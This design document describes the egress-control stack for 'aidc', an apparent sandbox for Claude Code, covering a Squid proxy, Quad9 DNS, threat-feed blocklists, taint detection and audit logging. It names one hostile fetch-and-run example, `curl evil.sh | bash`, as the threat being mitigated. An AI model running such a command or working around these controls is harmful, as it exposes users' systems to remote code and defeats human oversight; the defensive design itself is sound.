# Design 04 — Proxy Stack

**What this covers.** The whole egress-control infrastructure that lives alongside (not inside) the dev container: Squid forward proxy, Quad9 DNS upstream, blocklist refresher sidecar, policy/taint sidecar, and audit aggregator sidecar. This is the largest design doc because it's the area that diverges most from the original brief.

**Requirements implemented:** NET-01 through NET-12. Also touches SEC-02, SEC-03, SEC-07.

---

## TL;DR

aidc filters egress with a **blocklist**, not an allowlist. We keep the door wide open by default and slam it shut on known-bad destinations. Three layers, four containers:

1. **Quad9 DNS upstream** — broad threat-intel coverage for free
2. **Squid forward proxy** — HTTP/HTTPS gateway with policy ACLs
3. **State-actor TLD policy** — our own short list

Sidecars:

- **Refresher** keeps Squid's blocklist file fresh from URLhaus/ThreatFox/HaGeZi
- **Policy** tails Squid's access log, flags malware hits, manages taint state
- **Audit** aggregates logs and session artefacts for forensics

The stack runs as one Docker Compose unit per `aidc` session, launched by `aidc create`, torn down by `aidc kill`. Total resource cost: ~50–80 MB RAM.

---

## Filtering model: why blocklist, not allowlist

The original brief specified an allowlist proxy: explicitly permit a small set of domains (`pypi.org`, `registry.npmjs.org`, etc.) and deny everything else. We flipped this during planning.

Reasons:

- **Operational ergonomics.** An allowlist breaks every legitimate task that touches a domain we haven't pre-approved. Maintenance burden is real and falls disproportionately on the human (Pace).
- **Observed behavior.** Claude has shown discipline on egress — it pulls information when asked, not unprompted. The narrow worst case (`curl evil.sh | bash`) is better mitigated by blocking *evil.sh*, not by blocking everything except a curated list.
- **The blocklist universe is mature.** Free, well-maintained threat-intelligence feeds catch the actual threats. Allowlists punish the typical case to prevent the rare worst case.

Trade-off acknowledged: blocklists are imperfect. New malware not yet on URLhaus will not be blocked. Mitigations:

- Quad9's threat-intel partners cover a broader surface than any single feed.
- The state-actor TLD policy catches infrastructure-by-location even if no specific domain has been flagged.
- Taint detection (the policy sidecar) treats *any* blocklist hit as a strong compromise signal, prompting kill-and-recreate.

---

## Layer 1: DNS upstream (Quad9)

Quad9 (`9.9.9.9` and `149.112.112.112`) is a non-profit Swiss DNS resolver backed by ~20 industry threat-intelligence partners (IBM X-Force, F-Secure, Cisco Talos, Proofpoint, etc.). Bad domains return NXDOMAIN; legitimate lookups pass through. Effectively zero false positives at this scale; zero maintenance on our end.

**How aidc uses Quad9:**

- The dev container's `/etc/resolv.conf` is overridden at startup to point at `9.9.9.9` and `149.112.112.112`.
- Squid's `dns_nameservers` directive also points at Quad9. (Squid does its own DNS lookups for ACL evaluation; we want those filtered too.)
- No local caching DNS (no Pi-hole, no dnsmasq). Quad9 is fast and queries are cheap; an extra container hop isn't worth it.

**What Quad9 doesn't give us:**

- We don't see *which* domain was blocked or *why*. NXDOMAIN is opaque. That's fine for the broad threat catchment, but it means we need other layers for visibility.
- We can't customize what Quad9 blocks. Their threat intel; our trust.

---

## Layer 2: Squid forward proxy

Squid is the HTTP/HTTPS forward proxy through which all dev-container egress flows.

### Squid config (sketch)

The full config is the implementation's job; the design constraints are:

- Listen on port `3128`
- `dns_nameservers 9.9.9.9 149.112.112.112`
- ACL: `acl bad_tld dstdomain` reading from `/etc/squid/state-actor-tlds.txt` (our policy file)
- ACL: `acl malware_domains dstdomain` reading from `/etc/squid/blocklist.txt` (refresher-managed)
- `http_access deny malware_domains`
- `http_access deny bad_tld`  (note: configurable per devcontainer whether bad_tld also taints; default is log+block, no taint)
- `http_access allow all`
- `access_log /var/log/squid/access.log squid` (the format the policy sidecar parses)
- Logs rotate inside the Squid container; the audit aggregator copies them out

### What Squid sees on HTTPS

By default, Squid only sees the **CONNECT host:port** for HTTPS — it cannot inspect URLs, headers, or bodies. That's enough for our needs: we block by domain, and the domain is in the CONNECT. We deliberately do **not** enable SSL bumping (MITM with an installed CA cert) — adding that capability would also add CA-management complexity, more attack surface, and a bunch of "Squid sees decrypted traffic" failure modes we don't want.

This is a meaningful constraint: aidc cannot enforce policy on *which paths* are fetched from a given domain. We can block `github.com` entirely; we can't block "only block GitHub pulls but allow GitHub clones." For our threat model that's fine.

### Logging

Squid writes `access.log` in standard squid format. Every request includes:

- Timestamp, client IP (inner container), result code (`TCP_DENIED` for blocked, `TCP_MISS/200` for allowed, etc.), bytes, request method, URL or `host:port`, content type.

The policy sidecar parses this in real time. The audit aggregator archives it to host disk.

---

## Layer 3: State-actor TLD policy

A small, hand-maintained file:

```
# /etc/squid/state-actor-tlds.txt
.ru
.cn
.by
.ir
.kp
```

This is **policy**, not threat data. No feed publishes "block all of .ru" — that's a sovereign decision aidc's users make. Default list above; configurable per devcontainer via `.aidc/config.yaml`:

```yaml
state_actor_tlds:
  - .ru
  - .cn
  - .by
  - .ir
  - .kp
  - .su   # add this one
```

Per-project config can **add** TLDs (additive only — see NET-09). Removing a default TLD requires editing the global config explicitly, not via a per-project file.

By default, a TLD hit is logged and blocked but does **not** taint the container (SEC-04). Rationale: a typo or a stale link pointing at `.ru` is not the same compromise signal as a known-bad domain hit. The taint trigger for TLD hits is configurable; users who want stricter semantics can set `tld_taints: true`.

---

## Sidecars

All sidecars live in the same Docker Compose stack as Squid. They share named volumes for state and logs. They do not have access to the dev container's network namespace — they communicate with each other and with the host, not with Claude.

### Refresher sidecar (NET-06)

**Purpose:** Keep Squid's `/etc/squid/blocklist.txt` fresh.

**Image:** Alpine + `curl` + small shell script. ~10 MB.

**Behavior:**

1. On startup: fetch feeds, normalize, atomic-write blocklist, signal Squid. This guarantees every `aidc create` starts with a current list.
2. Then loop: `sleep 6h`, fetch, normalize, atomic-write, signal.

**Feeds fetched** (URLs baked into the image per NET-12):

- URLhaus host list — `https://urlhaus.abuse.ch/downloads/hostfile/`
- ThreatFox domain list (CSV → extract domains) — `https://threatfox.abuse.ch/export/csv/recent/`
- HaGeZi Threat-Intelligence Feeds — `https://raw.githubusercontent.com/hagezi/dns-blocklists/main/wildcard/tif.txt`

**Normalization:** Each feed has its own format. The refresh script reads each, strips comments and IPs, deduplicates, sorts, writes to `/etc/squid/blocklist.txt.new`, validates non-empty, then `mv` atomic-renames to `/etc/squid/blocklist.txt`. Squid never sees a partial write.

**Signaling Squid:** Compose configures the refresher with `pid: "service:squid"`. The refresher sends `kill -HUP 1` (Squid's PID 1 in the shared namespace) which Squid interprets as "reread config and ACLs." No Docker socket exposure required.

**Failure semantics (NET-11):** If a feed is unreachable, the refresher logs the failure and keeps the previous blocklist in place. It does NOT crash and does NOT empty the blocklist on partial failure. If all three feeds fail, the previous list keeps serving. The audit aggregator captures the refresher's logs so refresh failures are visible after the fact.

**Resource cost:** ~3 MB idle, ~10–15 MB during fetch. Negligible.

### Policy sidecar (NET-07, SEC-02, SEC-03)

**Purpose:** Real-time taint detection.

**Image:** Alpine + tiny log tailer (shell or a ~50-line Python script). ~10 MB.

**Behavior:**

1. Tail `/var/log/squid/access.log` (shared volume with Squid).
2. For each access line, parse the destination domain.
3. If the line is a `TCP_DENIED` event and the deny reason involves the `malware_domains` ACL (i.e., a hit on the refresher-managed blocklist), trigger taint.
4. If the deny involves only `bad_tld`, log but do not taint (unless the per-session config enables `tld_taints: true`).
5. Taint action: write `/var/state/tainted` with timestamp + offending line. Then execute the configured taint response (see `design-07-safety-model.md`).

**Configurable response** (SEC-05):

- `log` — just write the flag. Surfaced by `aidc status`.
- `notify` — additionally write to a host-visible fifo or call a webhook so the human sees it now. Default.
- `freeze` — additionally call `docker pause aidc-<session>-dev`. Strict mode for unattended runs.

The policy sidecar reads the response setting at startup from the session's effective config (per-project merged onto global). Changing the setting requires `aidc kill` + `aidc create` — there's no live reconfig path. (We could add one; not v1.)

**Resource cost:** ~3–5 MB. Always-on tail loop, no I/O burst.

### Audit aggregator sidecar (NET-08)

**Purpose:** Collect forensic data so that post-incident review is possible.

**Image:** Alpine + a small fluent-bit-ish process OR a `tail-and-cp` shell script. ~10 MB. Probably the shell-script version for v1 — fluent-bit is more capable than we need.

**What it collects** (into `${audit_dir}/${session}-${timestamp}/`):

- `squid-access.log` — copied from Squid's volume, rotated daily, never deleted while the session lives
- `dev-shell-history` — pulled from the dev container's `~/.bash_history` and `~/.zsh_history` periodically
- `claude-transcript/` — Claude Code's session transcript directory, if the user has configured Claude Code to write one to a known path
- `policy-events.log` — every taint event the policy sidecar wrote
- `refresher.log` — feed fetch successes/failures
- `meta.json` — session start/end timestamps, profile, config snapshot, container image digests

**Where it lands on host:**

The compose stack mounts `${audit_dir}` (default `~/aidc-audit/`) from host into the audit container. The dev container also has a read-only mount of `/var/aidc/audit` so Claude can see what's been logged (transparency: Claude knows it's being audited). `aidc status` surfaces the audit directory path.

**Lifecycle:** Audit data persists after `aidc kill` by default. The host-side `audit_dir` accumulates per-session subdirectories. Cleaning up is a user choice — could be future `aidc audit-prune` command. (P2.)

**Resource cost:** ~5–10 MB. Most cost is I/O when copying logs; throughput is low.

---

## Per-project blocklist additions (NET-09)

A repo can ship `.aidc/blocklist.conf`:

```
# Add domains specific to this project's threat model
internal-test-fixture-host.example
phishingtestbed.example
```

At proxy startup, the refresher prepends these to `/etc/squid/blocklist.txt`. They are **never removed** by feed refreshes — feed-sourced lines and project-sourced lines are concatenated with deduplication. A line in `.aidc/blocklist.conf` is permanent for the session.

**Additive-only enforcement:** projects cannot mark domains as "always allow." The format is a list of domains to block; there is no `unblock:` directive and no allow file. This is a deliberate one-way safety property: a project cannot loosen the global policy, only tighten it.

---

## How the stack starts

`aidc create my-session` orchestrates:

1. Resolve effective config (global + per-project merge).
2. Generate a per-session `docker-compose.yaml` for the proxy stack with the session name baked in.
3. `docker compose up -d` the proxy stack. Wait for Squid to report healthy (HTTP CONNECT to a known-good domain succeeds).
4. Run the refresher's startup fetch (it does this automatically as its first action — but `aidc create` waits for confirmation in the refresher's log).
5. Build/pull the dev container image.
6. Start the dev container with `HTTP_PROXY` / `HTTPS_PROXY` pointing at `aidc-my-session-squid:3128` and DNS pointing at Quad9.
7. Run `postCreateCommand` to seed tmux and Claude Code.

Order matters: proxy stack must be ready before the dev container starts pulling base images, or those pulls go direct and bypass policy.

---

## How the stack stops

`aidc kill my-session`:

1. `docker pause aidc-my-session-dev` (freeze Claude immediately).
2. Final log flush: audit aggregator copies last access lines.
3. `docker compose down` the proxy stack.
4. `docker rm -f aidc-my-session-dev`.
5. Audit dir is preserved on host. Audit dir's `meta.json` gets a `killed_at` timestamp appended.

Tainted sessions get the same treatment — taint is not a special exit path, just a flag that surfaces in `aidc status` and may have already triggered the freeze response.

---

## Cross-platform notes

| Platform | Notes |
|----------|-------|
| **macOS / Docker Desktop** | All stack containers run inside the Docker Desktop Linux VM. `aidc-<session>-squid` is reachable from the dev container by container name; from the host, port `3128` is **not** exposed to the host (deliberately — Squid only serves the inner stack). |
| **Linux native** | Same topology. No port exposure to host. |
| **WSL2** | Identical to Linux from the proxy stack's perspective. The CLI runs in WSL2; Docker Desktop's WSL2 integration handles the daemon. |

There are no platform-specific code paths in any of the proxy stack components.

---

## Resource budget

| Component | RAM idle | RAM peak |
|-----------|----------|----------|
| Squid | ~30 MB | ~50 MB under load |
| Refresher | ~3 MB | ~15 MB during fetch |
| Policy | ~3 MB | ~5 MB |
| Audit | ~5 MB | ~10 MB during copy |
| **Total** | **~40 MB** | **~80 MB peak** |

CPU is essentially zero except during refresh cycles (~1 second every 6h) and during heavy Squid load. Disk is dominated by logs; the audit dir grows linearly with session activity.

---

## What's deferred

- **Filesystem diff sidecar** — capture what Claude modified in the host repo during a session. Useful forensic feature; deferred to v2.
- **Live config reload for taint response** — currently requires kill + create. Could add a signalable reload to the policy sidecar later.
- **Sysbox runtime** — covered in `design-03-docker-isolation.md`.
- **Phase 2 HTTP control API sidecar** — covered in `design-06-remote-control.md`.

---

## References

- Squid documentation: http://www.squid-cache.org/Doc/config/
- URLhaus: https://urlhaus.abuse.ch/
- ThreatFox: https://threatfox.abuse.ch/
- HaGeZi DNS Blocklists: https://github.com/hagezi/dns-blocklists
- Quad9: https://quad9.net/
